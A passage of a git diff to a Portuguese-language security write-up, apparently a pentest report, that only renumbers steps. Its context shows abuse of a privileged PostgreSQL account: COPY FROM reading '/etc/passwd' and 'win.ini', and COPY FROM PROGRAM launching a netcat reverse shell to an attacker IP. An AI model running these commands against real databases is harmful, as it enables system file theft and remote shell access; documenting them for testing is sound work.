@@ -100,19 +100,19 @@ Foi identificado acesso ao serviço PostgreSQL com privilégios elevados (conta 
 
 Para ler arquivos do sistema, precisamos criar uma tabela para armazenar a saída do comando e usar o comando COPY FROM para obter os dados de um arquivo para a tabela declarada.
 
-1.      Criando a tabela
+1 - Criando a tabela
 
 ```bash
 CREATE TABLE cmd_exec(output text);
 ```
 
-2.      Use o comando COPY FROM para ler o conteudo de arquivos como '/etc/passwd' no linux ou 'C:/WINDOWS/win.ini'
+2 - Use o comando COPY FROM para ler o conteudo de arquivos como '/etc/passwd' no linux ou 'C:/WINDOWS/win.ini'
 
 ```bash
 COPY cmd_exec FROM '/etc/passwd';
 ```
 
-3.      Leia a tabela com o comando SELECT
+3 - Leia a tabela com o comando SELECT
 
 ```bash
 SELECT * FROM cmd_exec;
@@ -125,13 +125,13 @@ SELECT * FROM cmd_exec;
 
 Para executar comandos do sistema no Linux ou no Windows, precisamos usar o parâmetro PROGRAM. Começamos criando uma tabela; podemos nomeá-la como — shell.
 
-4.      Criando a tabela
+4 - Criando a tabela
 
 ```bash
 CREATE TABLE shell(output text);
 ```
 
-5.      Em seguida, use o parâmetro PROGRAM para passar o shell e configurar um ouvinte na máquina atacante.
+5 - Em seguida, use o parâmetro PROGRAM para passar o shell e configurar um ouvinte na máquina atacante.
 
 ```bash
 COPY shell FROM PROGRAM ‘rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.73.93 8000 >/tmp/f’;
